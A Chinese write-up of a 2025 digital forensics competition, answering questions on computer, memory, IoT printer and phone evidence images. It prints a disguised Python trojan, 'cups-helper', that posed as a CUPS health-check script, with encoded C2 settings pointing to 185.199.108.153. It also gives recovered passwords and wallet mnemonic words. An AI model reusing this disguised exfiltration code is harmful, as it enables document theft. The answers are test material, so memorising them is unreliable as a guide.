+## 50、用户的虚拟币钱包地址是？（答案格式：按照实际情况填写）（ ）
+## ？51、用户VC加密容器的密码是？（答案格式：按照实际情况填写）（ ）
+
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762077836878-319c0981-5438-409a-a770-61358c820ac7.png)
+
+接57题：
+
+打开多的一个word看到最后有点奇怪：
+
+## ![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076825496-edf6cb76-5d35-4c3d-a77c-6b8040053855.png)
+换个颜色：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762077126735-aeebefea-dc11-4dd8-a4da-ae7221dfefad.png)
+
+`SHUZHENGBEIctzy2025`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078304680-0b0754e3-a011-4d94-a512-388f9274a4df.png)
+
+vc打开是这样
+
+
+
+## 52、用户在生活中使用的代号是？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078287632-17b9043f-ea23-46c5-afb0-0f116e075339.png)
+
+## 53、李安东的银行卡归属哪个银行？（答案格式：农业银行）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071791720-ad83195f-6847-417a-82c8-714efdb0ce86.png)
+
+爆开即可
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071808184-fb9158aa-bb2e-4661-b8d2-4419234842e8.png)
+
+交通银行
+
+## 54、请分析某市10月6日最高气温是？（答案格式：1）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141315513-25f70ed5-7685-4ebb-aa8c-0948844d072c.png)
+
+
+
+两次伪加密。傻逼。
+
+`21`
+
+## ？55、用户的BitLocker密码是？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078513145-a4caf6c9-26d7-4df2-9613-75386990e405.png)
+
+这个软件解压之后发现是一个图片lsb隐写，想到刚才在邮箱里面找到的图片：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078594502-3e022272-4887-4d54-885a-4e6be5571532.png)
+
+扔到那个加解密软件里：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078618574-2a6d86d8-3f55-4345-8129-393391f78523.png)
+
+Bitlocker：`SZBJSJTM2025`
+
+## 56、用户办公室的门禁密码是？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078783063-9ad60a2d-b22d-40bd-9b5b-fa23beb75b8a.png)
+
+应该是这玩意
+
+用下一题的解密软件能够解开，![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141233956-c2a99132-e7b4-4af8-bad8-623ea3ca443e.png)
+
+仍不可读，读二进制源码：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141263599-711b15af-d545-4cf4-9d18-65ef7a80ed08.png)
+
+FFD9后面仍有数据（猜测答案应该是这个）：`147963258`
+
+## 57、用户使用的以D开头的解密程序的MD5值后六位是？（字母全大写，答案格式：AAAAAA）（ ）
+bitlocker打开，可以访问桌面的邮件：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076343370-2fcc5f4f-7006-4563-bea9-2be109d0a2f1.png)
+
+发现把zip被分成了3份，于是合一下：
+
+`copy /B 软件.part1.rar+软件.part2.rar+软件.part3.rar`
+
+但是还是没办法解压（提示不完整），所以搜一下有没有类似的文件：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076543370-c3659b23-e1f6-4215-9629-5bf669dc06f7.png)
+
+还真有。于是就再合并以下：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076677965-27858081-cb5e-4c66-a645-6511c56049d5.png)
+
+解压之后有两个文件：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076723498-c25a5376-a764-4cdc-9d23-955aa9cecef8.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762076742371-9b5752a6-d4ad-4243-8dce-4601b5b429f9.png)
+
+e829675d2cd181034eee06a697`3A892E`
+
+
+
+## 58、木马程序运行至系统断点前加载了几个动态链接库？（答案格式：1）（ ）
+不知道。
+
+下面两题用到了云沙箱：
+
+[https://s.threatbook.com/](https://s.threatbook.com/)
+
+## 59、木马产生的程序名称是什么？（答案格式：abcd.txt）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762081702431-05aa95fd-641d-43e8-8c30-3f2466634c56.png)
+
+## 60、木马尝试访问的域名是什么？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762081664139-2ace2e30-64b4-4dcc-aa8c-43270ffca303.png)
+
+   
+`&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;edu-image.nosdn.127.net&lt;/font&gt;`
+
+## 61、分析计算机内存检材，此内存镜像制作时的系统时间是？（使用双位数格式，答案格式：01月01日）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762078108438-11c630ff-4bc9-4fdd-a967-8a876e627d67.png)
+
+10月16日
+
+## 62、分析计算机内存检材，用户Yiyelin的用户表示后4位是？（答案格式：1111）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762075280225-5220012d-071a-4402-ac86-64064df650bd.png)
+
+4459
+
+## 63、分析计算机内存检材，计算机的CPU型号是什么？（答案格式： i9-1110U）（ ）
+## 64、分析计算机内存检材，wps.exe的PID是？（答案格式：1）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762075311785-4c03256a-6184-495a-8284-31868e8a20f6.png)
+
+5888
+
+## 65、分析计算机内存检材，此计算机开机自启动的远控软件名称是？（答案格式：abcd.txt）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762075333507-66da163f-8724-48ad-a9ab-c471e2f7c98f.png)
+
+`SunloginClient.exe`
+
+# 物联网设备取证分析
+参考：
+
+[28、Linux系统外设设备的取证分析-CSDN博客](https://blog.csdn.net/mm9012/article/details/149892600?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E6%89%93%E5%8D%B0%E6%9C%BA%E5%8F%96%E8%AF%81&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-149892600.142^v102^pc_search_result_base7)
+
+[2025数证杯wp-CSDN博客](https://blog.csdn.net/xcellencw/article/details/154254103?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522e5eabd44eb4375eae284a67d2176550c%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=e5eabd44eb4375eae284a67d2176550c&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-154254103-null-null.142^v102^pc_search_result_base7&amp;utm_term=2025%E6%95%B0%E8%AF%81%E6%9D%AF&amp;spm=1018.2226.3001.4187)
+
+## 66、打印机的主机名称是什么？(答案格式：root)（ ）
+`print`
+
+## 67、打印文件存储在哪个目录？(答案格式：/root/root)（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235261450-e7fac3c0-572a-4cb2-84f8-16f9756be9bf.png)
+
+&lt;font style=&quot;color:rgb(82, 196, 26);&quot;&gt;/var/spool/cups&lt;/font&gt;
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235275398-40b90ea1-1b90-4e88-a79a-665c3a2cf48b.png)
+
+正统做法：`物联网检材.E01/分区6/etc/cups`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235510116-3087451e-5810-4b45-a689-d55ecaa859f5.png)
+
+## 68、同一天，打印两份文件的用户是谁？(答案格式：root)（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762234822752-531842a5-6296-4773-bf9c-857ce652ca3f.png)
+
+`alice`
+
+## 69、分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）（ ）
+`物联网检材.E01/分区6/var/log`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235851632-f5695a32-ebca-4398-9c4a-9a06edbd319d.png)
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug <span class="number">6</span> <span class="number">14</span>:<span class="number">30</span>:01 PRINTER-RD-01 cups-helper[<span class="number">2177</span>]: Attempting to connect to C2 server </span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> on port <span class="number">443.</span></span><br></pre></td></tr></table></figure>
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235867404-cfa138e2-0af4-4b9e-9d29-863184f2928a.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762235799149-a636db46-dbfb-4679-a707-2ea6fd7bfe7c.png)
+
+`2177`
+
+## 70、分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762236999852-6995c071-a591-4e47-acf3-dae8bce1b55a.png)
+
+`物联网检材.E01/分区6/etc/cron.d`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762237121561-96dbd19c-1346-4b73-968b-67280b3da675.png)
+
+4个文件，遍历一下字段，发现了上一题提到的`cups-helper`木马程序
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762236988156-263efccd-1e53-4176-8f29-61a689dc0242.png)
+
+在ai提示下找到了对应的文件
+
+`10`分钟
+
+
+
+&lt;u&gt;ps:&lt;/u&gt;`&lt;u&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;crontab文件夹&lt;/font&gt;&lt;/u&gt;`&lt;u&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;是Linux系统中&lt;/font&gt;&lt;/u&gt;**&lt;u&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;存储和管理定时任务配置的目录结构&lt;/font&gt;&lt;/u&gt;**&lt;u&gt;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;。它的作用是让系统能够按照预定时间自动执行指定的命令或脚本。&lt;/font&gt;&lt;/u&gt;
+
+## 71、分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）（ ）
+`物联网检材.E01/分区6/usr/local/bin/cups-helper`
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A helper script to manage CUPS spooling and perform health checks.</span></span><br><span class="line"><span class="comment"># Do not modify unless you are an authorized technician.</span></span><br><span class="line"><span class="comment"># KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ======</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Configuration ---</span></span><br><span class="line"><span class="comment"># C2 server for uploading diagnostic data</span></span><br><span class="line">C2_SERVER = <span class="string">&quot;zUTMugDMx4SO5EjL1gTM&quot;</span></span><br><span class="line">C2_PORT = <span class="string">&quot;zQDN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spool directory to monitor</span></span><br><span class="line">SPOOL_DIR = <span class="string">&quot;GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define staging directory for processing before exfiltration</span></span><br><span class="line">STAGING_DIR = <span class="string">&quot;GJTJlh2YhNmLGJTJw1GdGJTJ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file for upload activities</span></span><br><span class="line">LOG_FILE = <span class="string">&quot;==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keyword to identify sensitive documents for &quot;special handling&quot;</span></span><br><span class="line">WATCHED_KEYWORD = <span class="string">&quot;=UmcpZmbvdWYyREMyUCdjVmavJHU&quot;</span></span><br><span class="line"><span class="comment"># --- End Configuration ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Appends a timestamped message to the log file.&quot;&quot;&quot;</span></span><br><span class="line">    now = datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    full_message = <span class="string">f&quot;[<span class="subst">&#123;now&#125;</span>] <span class="subst">&#123;message&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(LOG_FILE, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(full_message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_and_stage</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(Simulated) Scans the spool directory and copies sensitive files to the staging area.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exfiltrate_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(Simulated) &#x27;Uploads&#x27; files from the staging directory to the C2 server.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(STAGING_DIR):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    staged_files = os.listdir(STAGING_DIR)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> staged_files:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># The system log entry shows this connection attempt.</span></span><br><span class="line">        <span class="comment"># This part of the script provides the &quot;ground truth&quot; for that log.</span></span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">5</span>)</span><br><span class="line">        <span class="comment"># sock.connect((C2_SERVER, C2_PORT)) </span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> staged_files:</span><br><span class="line">            log_message(<span class="string">f&quot;SUCCESS: Uploaded <span class="subst">&#123;filename&#125;</span> to <span class="subst">&#123;C2_SERVER&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log_message(<span class="string">f&quot;ERROR: Could not connect to C2 server: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    scan_and_stage()</span><br><span class="line">    exfiltrate_data()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+&lt;details class=&quot;lake-collapse&quot;&gt;&lt;summary id=&quot;udb927641&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;尝试&lt;/span&gt;&lt;/summary&gt;&lt;p id=&quot;u06aacf04&quot; class=&quot;ne-p&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/54208227/1762237820406-dda794a7-6bad-434d-b3a9-d335f3668610.png&quot; width=&quot;1024&quot; id=&quot;q6uKg&quot; class=&quot;ne-image&quot;&gt;&lt;/p&gt;&lt;p id=&quot;ued884c76&quot; class=&quot;ne-p&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/54208227/1762237877941-c02c4146-6ccb-4e9c-989c-bb13131bff67.png&quot; width=&quot;1063.2&quot; id=&quot;L1w4d&quot; class=&quot;ne-image&quot;&gt;&lt;/p&gt;&lt;p id=&quot;u9be69164&quot; class=&quot;ne-p&quot;&gt;&lt;code class=&quot;ne-code&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;物联网检材.E01/分区6/root/.local/share&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;p id=&quot;ub4adbcf7&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;遍历一下这个目录，发现只有这个有。&lt;/span&gt;&lt;/p&gt;&lt;/details&gt;
+`zUTMugDMx4SO5EjL1gTM`对应`185.199.108.153`
+
+`zQDN`对应`443`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762238998411-ce6cb42c-e104-4193-9366-8a8b6145ef31.png)
+
+&gt; ds一坨屎没什么好多说的。
+&gt;
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762239316477-f36ebd67-ba6f-4989-9ef7-ff110fb9cf02.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762239341823-26210f78-1838-47b3-b767-46632b1e302b.png)
+
+%2F`tmp`%2F`.cache`%2F
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762239715533-8be39dd3-3e3a-46ad-bbd8-26f4891aaca0.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762239729930-3baa1266-68e7-4ce5-b636-b794540cb150.png)
+
+`/tmp/.cache/`
+
+## 72、分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）（ ）
+接69：`185.199.108.153`
+
+## 73、根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762239752145-21cb0baa-4ba7-480c-9262-4dc8c61e2139.png)
+
+`Project Dragonfire`
+
+# 移动终端取证分析
+做不出啊。
+
+## 74、分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141586186-f0e09689-5475-4e4c-bf8d-d1f8d11ffd61.png)
+
+&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;8390&lt;/font&gt;
+
+## 75、分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141656004-6267c197-c52c-40ee-96af-9b46d920443e.png)
+
+2025-09-24 19:37:42
+
+`09月24日`
+
+## 76、找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141774800-42f550a7-fc66-4a75-82f7-330ed0a3d477.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762141800202-385648e0-9291-4416-823e-13d12a13b88a.png)
+
+0x304fEd2927f47692E50158A1148a1B6550`3FE61F`
+
+## 77、分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142236005-31e5b4db-3098-4035-be19-6a8f9e40a498.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142241100-9f22328a-5f1d-4c9f-97bb-2bea69036995.png)
+
+25def5e31002f14894adef17d5`85A51D`
+
+## 78、手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142339782-2556cc9a-2335-43c6-83a4-46cecf124806.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142380606-88f17c8e-4151-4616-ba20-d2fd46c3afdf.png)
+
+`boost`
+
+## 79、找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142428631-7b6172d0-2d61-4c77-99ca-5ae86e40af7f.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142444908-b6c6553b-23c1-4251-9711-630e2163fb7e.png)
+
+`delay`
+
+## 80、找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142765937-a2790b8a-8ac7-4eaa-b2a7-74b4f0b2c65e.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142896914-f733d8d1-c628-4732-8faa-68995e6c1a44.png)
+
+student electric `quarter` clerk 
+
+
+
+&lt;details class=&quot;lake-collapse&quot;&gt;&lt;summary id=&quot;ua3e7816f&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;尝试&lt;/span&gt;&lt;/summary&gt;&lt;p id=&quot;u0d147b13&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;原顺序：movie unlock boost segment foil delay paddle obtain student electric quarter clerk&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;ud820e5b8&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;u6989f2b1&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;foil delay paddle obtain student electric quarter clerk movie unlock boost segment&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;ua645982f&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;student electric quarter clerk foil delay paddle obtain movie unlock boost segment&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;u99dea949&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;student electric quarter clerk movie unlock boost segment foil delay paddle obtain&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;uf7a19cae&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot; style=&quot;text-decoration: line-through&quot;&gt;更新完imtoken之后发现可以重置密码，于是在想是否可以通过爆破的方式爆破密码顺序？&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;u153baf9d&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot; style=&quot;text-decoration: line-through&quot;&gt;所以尝试yakit抓包爆破&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;u36a1ae10&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;这个验证不是联网的，是本地的。&lt;/span&gt;&lt;/p&gt;&lt;/details&gt;
+## 81、分析出该组助记词正常顺序中最后一个单词（已知助记词1、助记词2、助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）（ ）
+
+
+
+
+## 82、分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762145227862-e9937f12-8b48-45fc-a7c9-64898c6063a7.png)
+
+刘佳雨
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762150904441-645fc433-2358-49cc-86b1-372dc9c32c56.png)
+
+
+
+以下答题参考
+
+[2025数证杯初赛writeup](https://mp.weixin.qq.com/s/3krSu81iOGABqk9TNC6Sjw)
+
+## 83、得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）（ ）
+看了一下有两个软件比较怀疑：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762149677372-872af009-e025-4d9e-bd57-316a3dc16833.png)![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762149705028-e8f3b6a3-3553-4237-8c02-d4022c7d11df.png)
+
+后者数据库打不开，且都没办法仿真。
+
+根据下一题和答案格式的提示（因为叮通的数据库不可以直接打开），应该是后者。
+
+
+
+接84题
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152560518-f2fc28cc-4c12-43c6-b4ff-8fb6c41362bd.png)
+
+`dingtong.saichuang`
+
+## 84、接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）（ ）
+进入源码分析，查找加密函数
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152134876-be23afe1-9730-4f9e-8833-e257d0b0b833.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152156706-8e7f97ca-f22e-4279-82ef-fd1470d25a4a.png)
+
+加密数据库：dingtong.db
+
+密码：`@1@#!aajsk1*JKJ`
+
+解密用：![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152348256-d0e12793-eeeb-4c81-b2a1-5347e3f3561e.png)
+
+## 85、接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152565593-a3dd6739-f3bc-49c8-8788-d1cb934d4c96.png)
+
+[https://www.dingtong.cloud:88/dingtongFile/chatFile/a177943d17da4d74921854c27a0ca5a4.xlsx](https://www.dingtong.cloud:88/dingtongFile/chatFile/a177943d17da4d74921854c27a0ca5a4.xlsx)
+
+这里是一个文件下载网址，下载。同时也注意到了这里有个摩斯电码
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762152676597-ee2d44de-eedb-4274-88fb-6f10f129adfb.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762153235501-e0da3c7b-1c28-4a42-abe2-ee671abfdc4a.png)
+
+`QWERT666`
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762153255795-32617df5-ed13-44a0-9842-5bec00fda5ac.png)
+
+## 86、厉明的身份证地址登记的门牌号是多少？？（答案格式：1）（ ）
+于是看了一下密信的数据库：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762149744113-3f63e238-86ba-4ae5-ac87-ed823be2add3.png)
+
+发现了一个zip，找到解压：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762149835767-2fdd776c-6fb0-45a6-bcd6-64938a80b3be.png)
+
+`722`
+
+![](https://cdn.nlark.com/yuque/0/2025/jpeg/54208227/1762149808448-5d70fa10-5cd8-4b47-b373-dc07bf9970cd.jpeg)
+
+## 87、分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）（ ）
+&lt;details class=&quot;lake-collapse&quot;&gt;&lt;summary id=&quot;uf1d39dc5&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;尝试&lt;/span&gt;&lt;/summary&gt;&lt;p id=&quot;u7f860a5b&quot; class=&quot;ne-p&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/54208227/1762142644477-3a50b55f-b6e9-4b8e-80ea-c00c22679744.png&quot; width=&quot;456&quot; id=&quot;XYQL8&quot; class=&quot;ne-image&quot;&gt;&lt;/p&gt;&lt;p id=&quot;ub248d146&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;仿真之后发现了这个回信&lt;/span&gt;&lt;/p&gt;&lt;p id=&quot;u009a6c3e&quot; class=&quot;ne-p&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/54208227/1762153726305-5ad51b5c-e196-4782-84f3-7b7dd8030baf.png&quot; width=&quot;660&quot; id=&quot;PbDUu&quot; class=&quot;ne-image&quot;&gt;&lt;/p&gt;&lt;p id=&quot;uc0fb9868&quot; class=&quot;ne-p&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/54208227/1762153777558-8151aa6a-f3d1-4127-9021-90749a4c195d.png&quot; width=&quot;700&quot; id=&quot;zHOkO&quot; class=&quot;ne-image&quot;&gt;&lt;/p&gt;&lt;p id=&quot;u51c20ec0&quot; class=&quot;ne-p&quot;&gt;&lt;span 